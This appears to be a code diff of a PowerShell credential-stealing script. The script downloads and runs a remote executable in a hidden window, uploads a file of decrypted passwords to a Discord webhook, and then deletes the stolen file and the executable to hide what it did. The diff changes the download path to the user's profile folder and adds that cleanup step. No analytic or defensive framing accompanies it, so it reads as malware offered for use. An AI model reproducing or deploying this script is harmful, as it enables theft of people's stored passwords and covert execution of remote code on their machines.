@@ -1,7 +1,7 @@
 
-powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:TMP\d.exe
+powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.exe
 
-start-process "$env:TMP\d.exe"
+start-process "$env:USERPROFILE\d.exe"
 
 start-sleep 10
 
@@ -29,7 +29,6 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 Upload-Discord -file $env:USERPROFILE\decrypted_password.csv
-Upload-Discord -file $env:TMP\decrypted_password.csv
-
 
 get-childItem * -Include *decrypted_password.csv -Recurse | rm
+rm "$env:USERPROFILE\d.exe"
